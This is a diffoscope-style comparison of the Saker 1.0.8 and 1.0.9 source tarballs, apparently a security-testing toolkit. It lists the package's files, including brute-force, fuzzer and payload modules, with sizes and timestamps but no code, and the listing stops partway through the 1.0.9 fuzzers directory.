# Comparing `tmp/Saker-1.0.8.tar.gz` & `tmp/Saker-1.0.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\Saker-1.0.8.tar", last modified: Fri Jan  1 02:35:59 2021, max compression
+gzip compressed data, was "Saker-1.0.9.tar", last modified: Mon Dec 26 06:24:34 2022, max compression
```

## Comparing `Saker-1.0.8.tar` & `Saker-1.0.9.tar`

### file list

```diff
@@ -1,155 +1,164 @@
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/
--rw-rw-rw-   0        0        0     9535 2021-01-01 02:35:59.000000 Saker-1.0.8/PKG-INFO
--rw-rw-rw-   0        0        0     6584 2021-01-01 01:44:50.000000 Saker-1.0.8/README.md
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/Saker.egg-info/
--rw-rw-rw-   0        0        0     9535 2021-01-01 02:35:58.000000 Saker-1.0.8/Saker.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0     3158 2021-01-01 02:35:58.000000 Saker-1.0.8/Saker.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2021-01-01 02:35:58.000000 Saker-1.0.8/Saker.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0      162 2021-01-01 02:35:58.000000 Saker-1.0.8/Saker.egg-info/requires.txt
--rw-rw-rw-   0        0        0        6 2021-01-01 02:35:58.000000 Saker-1.0.8/Saker.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/
--rw-rw-rw-   0        0        0       46 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/__init__.py
--rw-rw-rw-   0        0        0      527 2020-11-12 01:14:20.000000 Saker-1.0.8/saker/__main__.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/api/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/__init__.py
--rw-rw-rw-   0        0        0      916 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/censys.py
--rw-rw-rw-   0        0        0      829 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/crtsh.py
--rw-rw-rw-   0        0        0      543 2020-12-22 00:49:39.000000 Saker-1.0.8/saker/api/dingtalk.py
--rw-rw-rw-   0        0        0     1088 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/dnsdumpster.py
--rw-rw-rw-   0        0        0      759 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/fofa.py
--rw-rw-rw-   0        0        0      554 2020-11-24 11:55:11.000000 Saker-1.0.8/saker/api/gaode.py
--rw-rw-rw-   0        0        0     4502 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/githubapi.py
--rw-rw-rw-   0        0        0      618 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/proxypool.py
--rw-rw-rw-   0        0        0      643 2020-11-17 08:31:57.000000 Saker-1.0.8/saker/api/shodanapi.py
--rw-rw-rw-   0        0        0     1296 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/sqlmap.py
--rw-rw-rw-   0        0        0     1129 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/api/threatcrowd.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/brute/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/__init__.py
--rw-rw-rw-   0        0        0     1067 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/basicAuth.py
--rw-rw-rw-   0        0        0     1787 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/brute.py
--rw-rw-rw-   0        0        0     1485 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/brute_win.py
--rw-rw-rw-   0        0        0     1823 2020-10-21 01:17:03.000000 Saker-1.0.8/saker/brute/cs.py
--rw-rw-rw-   0        0        0     1570 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/dir.py
--rw-rw-rw-   0        0        0     1189 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/domain.py
--rw-rw-rw-   0        0        0     2338 2020-10-21 01:08:54.000000 Saker-1.0.8/saker/brute/email.py
--rw-rw-rw-   0        0        0      862 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/ftp.py
--rw-rw-rw-   0        0        0      637 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/mysql.py
--rw-rw-rw-   0        0        0      809 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/smtp.py
--rw-rw-rw-   0        0        0      810 2020-11-12 01:50:37.000000 Saker-1.0.8/saker/brute/ssh.py
--rw-rw-rw-   0        0        0      877 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/telnet.py
--rw-rw-rw-   0        0        0      949 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/brute/zip.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/cmdline/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/cmdline/__init__.py
--rw-rw-rw-   0        0        0     2438 2020-11-12 01:08:15.000000 Saker-1.0.8/saker/cmdline/fuzz.py
--rw-rw-rw-   0        0        0     1314 2020-11-12 07:01:50.000000 Saker-1.0.8/saker/cmdline/fuzzsock.py
--rw-rw-rw-   0        0        0     1512 2020-11-12 01:06:53.000000 Saker-1.0.8/saker/cmdline/port.py
--rw-rw-rw-   0        0        0     1522 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/cmdline/scan.py
--rw-rw-rw-   0        0        0      971 2020-12-21 07:29:40.000000 Saker-1.0.8/saker/cmdline/server.py
--rw-rw-rw-   0        0        0      990 2020-12-30 02:44:03.000000 Saker-1.0.8/saker/cmdline/util.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/core/
--rw-rw-rw-   0        0        0       84 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/core/__init__.py
--rw-rw-rw-   0        0        0     3062 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/core/mutator.py
--rw-rw-rw-   0        0        0     1347 2020-11-12 08:40:40.000000 Saker-1.0.8/saker/core/rawhttp.py
--rw-rw-rw-   0        0        0     1948 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/core/request.py
--rw-rw-rw-   0        0        0     2954 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/core/scaner.py
--rw-rw-rw-   0        0        0     6420 2020-12-22 03:21:08.000000 Saker-1.0.8/saker/core/sess.py
--rw-rw-rw-   0        0        0     2078 2020-12-22 03:21:08.000000 Saker-1.0.8/saker/core/sock.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/data/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/data/__init__.py
--rw-rw-rw-   0        0        0      172 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/data/banner.py
--rw-rw-rw-   0        0        0      595 2020-09-18 02:03:40.000000 Saker-1.0.8/saker/data/sort.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/fuzzers/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/__init__.py
--rw-rw-rw-   0        0        0      309 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/bof.py
--rw-rw-rw-   0        0        0     2461 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/cmdi.py
--rw-rw-rw-   0        0        0     4982 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/code.py
--rw-rw-rw-   0        0        0       20 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/cookie.py
--rw-rw-rw-   0        0        0      512 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/cors.py
--rw-rw-rw-   0        0        0      607 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/crlf.py
--rw-rw-rw-   0        0        0      919 2020-11-12 01:45:26.000000 Saker-1.0.8/saker/fuzzers/dos.py
--rw-rw-rw-   0        0        0     3803 2020-10-24 10:32:50.000000 Saker-1.0.8/saker/fuzzers/fileinclude.py
--rw-rw-rw-   0        0        0      325 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/fmtstr.py
--rw-rw-rw-   0        0        0     2145 2020-12-30 11:54:18.000000 Saker-1.0.8/saker/fuzzers/fuzzer.py
--rw-rw-rw-   0        0        0     2870 2020-12-30 07:49:32.000000 Saker-1.0.8/saker/fuzzers/http.py
--rw-rw-rw-   0        0        0     2198 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/httpSmuggle.py
--rw-rw-rw-   0        0        0       29 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/image.py
--rw-rw-rw-   0        0        0     2783 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/json.py
--rw-rw-rw-   0        0        0      439 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/jsonp.py
--rw-rw-rw-   0        0        0      383 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/jwt.py
--rw-rw-rw-   0        0        0      933 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/ldap.py
--rw-rw-rw-   0        0        0     2171 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/mysqli.py
--rw-rw-rw-   0        0        0      467 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/nginx.py
--rw-rw-rw-   0        0        0      440 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/openredirect.py
--rw-rw-rw-   0        0        0     1230 2020-10-24 00:05:19.000000 Saker-1.0.8/saker/fuzzers/password.py
--rw-rw-rw-   0        0        0      268 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/psql.py
--rw-rw-rw-   0        0        0     1522 2020-10-28 00:48:17.000000 Saker-1.0.8/saker/fuzzers/sqli.py
--rw-rw-rw-   0        0        0      455 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/sqlite.py
--rw-rw-rw-   0        0        0      491 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/ssi.py
--rw-rw-rw-   0        0        0     5560 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/ssrf.py
--rw-rw-rw-   0        0        0      924 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/ssti.py
--rw-rw-rw-   0        0        0      224 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/template.py
--rw-rw-rw-   0        0        0      293 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/typecasting.py
--rw-rw-rw-   0        0        0     1401 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/url.py
--rw-rw-rw-   0        0        0    12952 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/xss.py
--rw-rw-rw-   0        0        0     1147 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/fuzzers/xxe.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/handler/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/handler/__init__.py
--rw-rw-rw-   0        0        0     1108 2020-12-22 03:21:08.000000 Saker-1.0.8/saker/handler/headerHandler.py
--rw-rw-rw-   0        0        0     2101 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/handler/htmlHandler.py
--rw-rw-rw-   0        0        0     5881 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/handler/wappalyzer.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/payloads/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/payloads/__init__.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/payloads/misc/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/payloads/misc/__init__.py
--rw-rw-rw-   0        0        0      587 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/payloads/misc/thinkphp5_rce.py
--rw-rw-rw-   0        0        0      718 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/payloads/misc.py
--rw-rw-rw-   0        0        0     3767 2020-11-29 00:58:25.000000 Saker-1.0.8/saker/payloads/phpShell.py
--rw-rw-rw-   0        0        0     1099 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/payloads/xdebug.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/port/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/__init__.py
--rw-rw-rw-   0        0        0      482 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/elasticsearch.py
--rw-rw-rw-   0        0        0      721 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/ftp.py
--rw-rw-rw-   0        0        0     1024 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/jdwp.py
--rw-rw-rw-   0        0        0      579 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/memcached.py
--rw-rw-rw-   0        0        0      485 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/mongo.py
--rw-rw-rw-   0        0        0     2798 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/nmap.py
--rw-rw-rw-   0        0        0       99 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/portBase.py
--rw-rw-rw-   0        0        0     2142 2020-09-23 02:15:32.000000 Saker-1.0.8/saker/port/probe.py
--rw-rw-rw-   0        0        0      872 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/redis.py
--rw-rw-rw-   0        0        0     2285 2021-01-01 02:09:10.000000 Saker-1.0.8/saker/port/ssh.py
--rw-rw-rw-   0        0        0      671 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/port/telnet.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/servers/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/servers/__init__.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/servers/http/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/servers/http/__init__.py
--rw-rw-rw-   0        0        0      996 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/servers/http/base.py
--rw-rw-rw-   0        0        0      830 2021-01-01 01:53:34.000000 Saker-1.0.8/saker/servers/http/ssrf.py
--rw-rw-rw-   0        0        0      532 2021-01-01 01:53:38.000000 Saker-1.0.8/saker/servers/http/xss.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/servers/socket/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/servers/socket/__init__.py
--rw-rw-rw-   0        0        0     1863 2020-10-11 05:45:39.000000 Saker-1.0.8/saker/servers/socket/dnsproxy.py
--rw-rw-rw-   0        0        0     1803 2020-10-11 05:47:44.000000 Saker-1.0.8/saker/servers/socket/dnsrebinding.py
--rw-rw-rw-   0        0        0      468 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/servers/socket/tcp.py
-drwxrwxrwx   0        0        0        0 2021-01-01 02:35:59.000000 Saker-1.0.8/saker/utils/
--rw-rw-rw-   0        0        0        0 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/__init__.py
--rw-rw-rw-   0        0        0      158 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/binutils.py
--rw-rw-rw-   0        0        0      411 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/color.py
--rw-rw-rw-   0        0        0     1956 2020-11-04 06:21:23.000000 Saker-1.0.8/saker/utils/configcheck.py
--rw-rw-rw-   0        0        0     5918 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/daemon.py
--rw-rw-rw-   0        0        0     2205 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/datatype.py
--rw-rw-rw-   0        0        0     4626 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/domain.py
--rw-rw-rw-   0        0        0      834 2020-12-30 02:44:34.000000 Saker-1.0.8/saker/utils/encode.py
--rw-rw-rw-   0        0        0     1672 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/fakeid.py
--rw-rw-rw-   0        0        0     1408 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/flaskencoder.py
--rw-rw-rw-   0        0        0      444 2020-09-19 23:44:58.000000 Saker-1.0.8/saker/utils/geoip.py
--rw-rw-rw-   0        0        0      625 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/hash.py
--rw-rw-rw-   0        0        0     7953 2020-12-30 11:47:16.000000 Saker-1.0.8/saker/utils/httpparser.py
--rw-rw-rw-   0        0        0      498 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/info.py
--rw-rw-rw-   0        0        0     1994 2020-11-03 05:33:56.000000 Saker-1.0.8/saker/utils/logger.py
--rw-rw-rw-   0        0        0     1327 2020-12-22 00:58:19.000000 Saker-1.0.8/saker/utils/mtime.py
--rw-rw-rw-   0        0        0     1495 2020-11-14 01:48:51.000000 Saker-1.0.8/saker/utils/paths.py
--rw-rw-rw-   0        0        0     1519 2020-12-22 03:21:08.000000 Saker-1.0.8/saker/utils/serializer.py
--rw-rw-rw-   0        0        0      626 2020-11-12 01:34:46.000000 Saker-1.0.8/saker/utils/show.py
--rw-rw-rw-   0        0        0     2221 2020-09-18 02:03:41.000000 Saker-1.0.8/saker/utils/url.py
--rw-rw-rw-   0        0        0       42 2021-01-01 02:35:59.000000 Saker-1.0.8/setup.cfg
--rw-rw-rw-   0        0        0     1070 2021-01-01 01:43:30.000000 Saker-1.0.8/setup.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.186686 Saker-1.0.9/
+-rw-rw-rw-   0        0        0    35141 2021-10-19 00:56:15.000000 Saker-1.0.9/LICENSE
+-rw-rw-rw-   0        0        0     9535 2022-12-26 06:24:34.185682 Saker-1.0.9/PKG-INFO
+-rw-rw-rw-   0        0        0     6584 2021-10-19 00:56:15.000000 Saker-1.0.9/README.md
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:33.922924 Saker-1.0.9/Saker.egg-info/
+-rw-rw-rw-   0        0        0     9535 2022-12-26 06:24:33.000000 Saker-1.0.9/Saker.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0     3327 2022-12-26 06:24:33.000000 Saker-1.0.9/Saker.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2022-12-26 06:24:33.000000 Saker-1.0.9/Saker.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0      162 2022-12-26 06:24:33.000000 Saker-1.0.9/Saker.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        6 2022-12-26 06:24:33.000000 Saker-1.0.9/Saker.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:33.925916 Saker-1.0.9/saker/
+-rw-rw-rw-   0        0        0       46 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/__init__.py
+-rw-rw-rw-   0        0        0      580 2021-12-25 07:43:01.000000 Saker-1.0.9/saker/__main__.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:33.952382 Saker-1.0.9/saker/api/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/__init__.py
+-rw-rw-rw-   0        0        0      916 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/censys.py
+-rw-rw-rw-   0        0        0      865 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/crtsh.py
+-rw-rw-rw-   0        0        0      543 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/dingtalk.py
+-rw-rw-rw-   0        0        0     1088 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/dnsdumpster.py
+-rw-rw-rw-   0        0        0      887 2022-07-26 02:22:15.000000 Saker-1.0.9/saker/api/fofa.py
+-rw-rw-rw-   0        0        0      554 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/gaode.py
+-rw-rw-rw-   0        0        0     4502 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/githubapi.py
+-rw-rw-rw-   0        0        0      655 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/icp.py
+-rw-rw-rw-   0        0        0      618 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/proxypool.py
+-rw-rw-rw-   0        0        0     1365 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/rwhois.py
+-rw-rw-rw-   0        0        0      643 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/shodanapi.py
+-rw-rw-rw-   0        0        0     1296 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/sqlmap.py
+-rw-rw-rw-   0        0        0     1129 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/threatcrowd.py
+-rw-rw-rw-   0        0        0      582 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/api/whois.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:33.981927 Saker-1.0.9/saker/brute/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/__init__.py
+-rw-rw-rw-   0        0        0     1067 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/basicAuth.py
+-rw-rw-rw-   0        0        0     1787 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/brute.py
+-rw-rw-rw-   0        0        0     1485 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/brute_win.py
+-rw-rw-rw-   0        0        0     1823 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/cs.py
+-rw-rw-rw-   0        0        0     1570 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/dir.py
+-rw-rw-rw-   0        0        0     1189 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/domain.py
+-rw-rw-rw-   0        0        0     2338 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/email.py
+-rw-rw-rw-   0        0        0      862 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/ftp.py
+-rw-rw-rw-   0        0        0      637 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/mysql.py
+-rw-rw-rw-   0        0        0      809 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/smtp.py
+-rw-rw-rw-   0        0        0      810 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/ssh.py
+-rw-rw-rw-   0        0        0      877 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/telnet.py
+-rw-rw-rw-   0        0        0      949 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/brute/zip.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:33.999466 Saker-1.0.9/saker/cmdline/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/__init__.py
+-rw-rw-rw-   0        0        0     1143 2021-12-25 07:48:07.000000 Saker-1.0.9/saker/cmdline/file.py
+-rw-rw-rw-   0        0        0     2438 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/fuzz.py
+-rw-rw-rw-   0        0        0     1314 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/fuzzsock.py
+-rw-rw-rw-   0        0        0     1585 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/poc.py
+-rw-rw-rw-   0        0        0     1612 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/port.py
+-rw-rw-rw-   0        0        0     1522 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/scan.py
+-rw-rw-rw-   0        0        0      971 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/cmdline/server.py
+-rw-rw-rw-   0        0        0     1390 2022-06-16 09:52:34.000000 Saker-1.0.9/saker/cmdline/util.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.014696 Saker-1.0.9/saker/core/
+-rw-rw-rw-   0        0        0       84 2022-11-16 01:54:45.000000 Saker-1.0.9/saker/core/__init__.py
+-rw-rw-rw-   0        0        0     3015 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/mutator.py
+-rw-rw-rw-   0        0        0      389 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/poc.py
+-rw-rw-rw-   0        0        0     1347 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/rawhttp.py
+-rw-rw-rw-   0        0        0     1901 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/request.py
+-rw-rw-rw-   0        0        0     2907 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/scaner.py
+-rw-rw-rw-   0        0        0     6581 2022-12-20 07:47:54.000000 Saker-1.0.9/saker/core/sess.py
+-rw-rw-rw-   0        0        0     2161 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/core/sock.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.019215 Saker-1.0.9/saker/data/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/data/__init__.py
+-rw-rw-rw-   0        0        0      172 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/data/banner.py
+-rw-rw-rw-   0        0        0      595 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/data/sort.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.080794 Saker-1.0.9/saker/fuzzers/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/fuzzers/__init__.py
+-rw-rw-rw-   0        0        0      309 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/bof.py
+-rw-rw-rw-   0        0        0     2461 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/cmdi.py
+-rw-rw-rw-   0        0        0     4982 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/code.py
+-rw-rw-rw-   0        0        0       20 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/cookie.py
+-rw-rw-rw-   0        0        0      512 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/cors.py
+-rw-rw-rw-   0        0        0      607 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/crlf.py
+-rw-rw-rw-   0        0        0      919 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/dos.py
+-rw-rw-rw-   0        0        0     3803 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/fileinclude.py
+-rw-rw-rw-   0        0        0      325 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/fmtstr.py
+-rw-rw-rw-   0        0        0     2145 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/fuzzer.py
+-rw-rw-rw-   0        0        0     2870 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/http.py
+-rw-rw-rw-   0        0        0     2198 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/httpSmuggle.py
+-rw-rw-rw-   0        0        0       29 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/image.py
+-rw-rw-rw-   0        0        0     3070 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/json.py
+-rw-rw-rw-   0        0        0      439 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/jsonp.py
+-rw-rw-rw-   0        0        0      383 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/jwt.py
+-rw-rw-rw-   0        0        0      933 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/ldap.py
+-rw-rw-rw-   0        0        0     2171 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/mysqli.py
+-rw-rw-rw-   0        0        0      467 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/nginx.py
+-rw-rw-rw-   0        0        0      440 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/openredirect.py
+-rw-rw-rw-   0        0        0     1230 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/password.py
+-rw-rw-rw-   0        0        0      268 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/psql.py
+-rw-rw-rw-   0        0        0     1522 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/sqli.py
+-rw-rw-rw-   0        0        0      455 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/sqlite.py
+-rw-rw-rw-   0        0        0      491 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/ssi.py
+-rw-rw-rw-   0        0        0     5634 2022-03-01 01:29:50.000000 Saker-1.0.9/saker/fuzzers/ssrf.py
+-rw-rw-rw-   0        0        0      924 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/ssti.py
+-rw-rw-rw-   0        0        0      224 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/template.py
+-rw-rw-rw-   0        0        0      293 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/typecasting.py
+-rw-rw-rw-   0        0        0     1401 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/url.py
